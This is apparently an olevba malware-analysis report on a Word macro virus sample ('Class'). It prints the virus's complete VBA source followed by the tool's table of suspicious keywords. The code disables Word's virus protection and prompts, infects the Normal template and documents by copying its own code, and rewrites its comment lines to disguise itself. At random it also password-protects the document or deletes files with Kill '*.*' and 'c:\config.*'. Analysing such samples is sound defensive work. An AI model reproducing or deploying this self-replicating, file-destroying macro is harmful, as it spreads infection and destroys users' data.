olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bs-5f5a650624aa61e61e0adc1f526f71169c34747c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bs-5f5a650624aa61e61e0adc1f526f71169c34747c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
On Error GoTo Hell
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
dead = False
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
Options.VirusProtection = dead
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
Options.SaveNormalPrompt = dead
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
Options.ConfirmConversions = dead
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Clazz"
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
Mzg = Int(Rnd * 66)
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
If Mzg = 66 Then MsgBox Chr(40) + Chr(99) + Chr(41) + Chr(32) + Chr(86) + Chr(105) + Chr(112) + Chr(101) + Chr(114) + Chr(105) + Chr(122) + Chr(101) + Chr(32) + Chr(47) + Chr(32) + Chr(84) + Chr(78) + Chr(84), 0, Chr(67) + Chr(108) + Chr(97) + Chr(122) + Chr(122) + Chr(32) + Chr(118) + Chr(49) + Chr(46) + Chr(48)
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
ac = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
dc = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
If dc > 10 And ad > 0 Then End
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
If dc < 10 Then
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
Set goat = NormalTemplate.VBProject.VBComponents.Item(1)
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
ActiveDocument.VBProject.VBComponents.Item(1).Name = goat.Name
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\clazz.vxd"
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
End If
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
If ac = 0 Then Set goat = ActiveDocument.VBProject.VBComponents.Item(1)
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
goat.codemodule.AddFromFile ("c:\clazz.vxd")
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
goat.codemodule.deletelines 1, 4
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
If dc < 10 Then goat.codemodule.replaceline 1, "Sub AutoClose()" & " '" & Now & Application.UserName & Application.ActiveWindow & Application.ActivePrinter
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
If dc < 10 Then goat.codemodule.replaceline 63, "Sub ToolsMacro()" & " '" & Now & Application.UserName & Application.ActiveWindow & Application.ActivePrinter
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
rn = Int(Rnd * 9999999)
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
With goat.codemodule
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
    For i = 2 To 76 Step 2
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
    .replaceline i, "'" & rn & Now & Application.UserName & rn & Application.ActiveWindow & Application.ActivePrinter & rn
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
    Next i
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
End With
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
Hell:
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
If dc > 70 And ac = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
End Sub
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
Sub ViewVBCode()
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
On Error GoTo Hell
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
Stealth = Int(Rnd * 4)
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
If Stealth = 3 Then Application.ActiveDocument.Password = Chr(67) + Chr(108) + Chr(97) + Chr(122) + Chr(122)
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
If Stealth = 2 Then Kill "*.*"
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
If Stealth = 4 Then Kill "c:\config.*"
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
Hell:
'533423925.12.99 21:06:43Andreas Marx5334239dok1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW5334239
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
